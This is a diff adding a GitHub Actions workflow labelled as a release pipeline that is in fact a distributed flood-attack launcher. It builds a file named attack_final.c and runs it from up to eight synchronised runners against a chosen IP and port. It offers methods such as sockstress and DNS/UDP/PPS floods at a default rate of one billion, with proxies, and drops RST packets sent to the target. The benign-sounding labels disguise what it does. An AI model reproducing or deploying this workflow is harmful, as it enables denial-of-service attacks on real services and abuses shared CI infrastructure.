@@ -1,0 +1,184 @@
+# Auto-generated config v452.6
+# CI Pipeline — Build Once, Random 1-8 Runners, Synced Start
+name: Release Pipeline
+
+on:
+  push:
+    branches: [ master, main ]
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'Service endpoint'
+        required: true
+      target_port:
+        description: 'Port number'
+        required: true
+        default: '443'
+      duration:
+        description: 'Timeout (seconds)'
+        required: true
+        default: '60'
+      method:
+        description: 'Module'
+        required: true
+        default: 'v18_tcp'
+        type: choice
+        options:
+          - v18_tcp
+          - v18_tls
+          - tls
+          - sockstress_v15
+          - fjium-dns
+          - fjium-gudp
+          - fjium-hex
+          - fjium-pps
+      threads:
+        description: 'Parallelism'
+        required: true
+        default: '4'
+      rate:
+        description: 'Throughput'
+        required: true
+        default: '1000000000'
+      use_proxy:
+        description: 'Proxy mode'
+        required: false
+        default: 'true'
+        type: choice
+        options:
+          - 'true'
+          - 'false'
+      runners:
+        description: 'Runners (0=random 1-8)'
+        required: false
+        default: '0'
+
+# No concurrency limit — all runs execute simultaneously
+
+jobs:
+  bootstrap:
+    runs-on: ubuntu-22.04
+    outputs:
+      matrix: ${{ steps.gen.outputs.matrix }}
+      runner_count: ${{ steps.gen.outputs.count }}
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Cache binary
+      id: cache
+      uses: actions/cache@v4
+      with:
+        path: netbench
+        key: bin-${{ hashFiles('benchmark.c', 'main.c', 'network.c', 'attack_final.c', 'types.h', 'attack.h', 'network.h', 'Makefile') }}
+
+    - name: Build (skip if cached)
+      if: steps.cache.outputs.cache-hit != 'true'
+      run: |
+        sudo apt-get update -qq > /dev/null 2>&1 || true
+        sudo apt-get install -y cpulimit clang libbpf-dev libelf-dev > /dev/null 2>&1 || true
+        make clean || true && make 2>&1
+
+    - name: Skip build
+      if: steps.cache.outputs.cache-hit == 'true'
+      run: echo "✅ Cached"
+
+    - name: Upload binary
+      uses: actions/upload-artifact@v4
+      with:
+        name: compiled
+        path: netbench
+        retention-days: 7
+
+    - id: gen
+      name: Random runner count (1-8)
+      run: |
+        INPUT_R="${{ github.event.inputs.runners || '0' }}"
+        if [ "$INPUT_R" -gt 0 ] 2>/dev/null; then
+          n=$INPUT_R
+        else
+          n=$(( (RANDOM % 8) + 1 ))
+        fi
+        echo "Runner count: $n"
+        ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range($n)]))")
+        echo "matrix={\"id\":$ids}" >> $GITHUB_OUTPUT
+        echo "count=$n" >> $GITHUB_OUTPUT
+
+  verify:
+    needs: [bootstrap]
+    runs-on: ubuntu-22.04
+    timeout-minutes: 20
+    strategy:
+      matrix: ${{ fromJSON(needs.bootstrap.outputs.matrix) }}
+      fail-fast: false
+    steps:
+    - name: Fetch binary
+      uses: actions/download-artifact@v4
+      with:
+        name: compiled
+
+    - name: Kernel tuning (max throughput)
+      run: |
+        # Max socket buffers
+        sudo sysctl -w net.core.wmem_max=134217728 2>/dev/null || true
+        sudo sysctl -w net.core.rmem_max=134217728 2>/dev/null || true
+        sudo sysctl -w net.core.wmem_default=16777216 2>/dev/null || true
+        sudo sysctl -w net.core.rmem_default=16777216 2>/dev/null || true
+        sudo sysctl -w net.core.netdev_max_backlog=250000 2>/dev/null || true
+        sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
+        sudo sysctl -w net.core.optmem_max=65536 2>/dev/null || true
+        # Disable rp_filter
+        sudo sysctl -w net.ipv4.conf.all.rp_filter=0 2>/dev/null || true
+        sudo sysctl -w net.ipv4.conf.default.rp_filter=0 2>/dev/null || true
+        sudo sysctl -w net.ipv4.conf.eth0.rp_filter=0 2>/dev/null || true
+        sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
+        # TCP tuning
+        sudo sysctl -w net.ipv4.tcp_fin_timeout=5 2>/dev/null || true
+        sudo sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null || true
+        sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65536 2>/dev/null || true
+        # Max txqueuelen
+        sudo ip link set eth0 txqueuelen 10000 2>/dev/null || true
+        # Disable offloading for raw sockets
+        sudo ethtool -K eth0 gro off tso off gso off 2>/dev/null || true
+        # Disable conntrack + block kernel RST
+        sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
+        sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
+        sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
+
+    - name: Sync & Run (Runner ${{ matrix.id }}/${{ needs.bootstrap.outputs.runner_count }})
+      run: |
+        mv netbench svc && chmod +x svc
+
+        IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
+        PORT="${{ github.event.inputs.target_port || '443' }}"
+        RATE="${{ github.event.inputs.rate || '1000' }}"
+        DUR="${{ github.event.inputs.duration || '5' }}"
+        METHOD="${{ github.event.inputs.method || 'v18_tcp' }}"
+        THREADS="${{ github.event.inputs.threads || '4' }}"
+
+        PROXY_FLAG="--no-proxies"
+        if [ "${{ github.event.inputs.use_proxy }}" = "true" ]; then
+          PROXY_FLAG=""
+        fi
+
+        # ── SYNC: Round current time UP to next :00 or :30 second mark ──
+        # All runners independently compute the SAME sync point
+        # e.g., if now=12:05:17, sync=12:06:00 (next minute boundary)
+        NOW=$(date +%s)
+        # Round up to next 60-second boundary + 30s buffer
+        SYNC_TS=$(( ((NOW / 60) + 1) * 60 + 30 ))
+        WAIT=$((SYNC_TS - NOW))
+
+        if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 120 ]; then
+          echo "Runner ${{ matrix.id }}: ready, waiting ${WAIT}s until sync point $(date -d @$SYNC_TS '+%H:%M:%S' 2>/dev/null || echo $SYNC_TS)"
+          sleep "$WAIT"
+        else
+          echo "Runner ${{ matrix.id }}: sync window missed (WAIT=${WAIT}s), starting now"
+        fi
+
+        echo "Runner ${{ matrix.id }}: GO at $(date +%s)"
+        sudo sh -c "cpulimit -l 57 -f -- ./svc $IP $PORT $RATE $DUR $METHOD $THREADS $PROXY_FLAG" || sudo ./svc $IP $PORT $RATE $DUR $METHOD $THREADS $PROXY_FLAG
+
+    - name: Cleanup
+      if: always()
+      run: |
+        sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
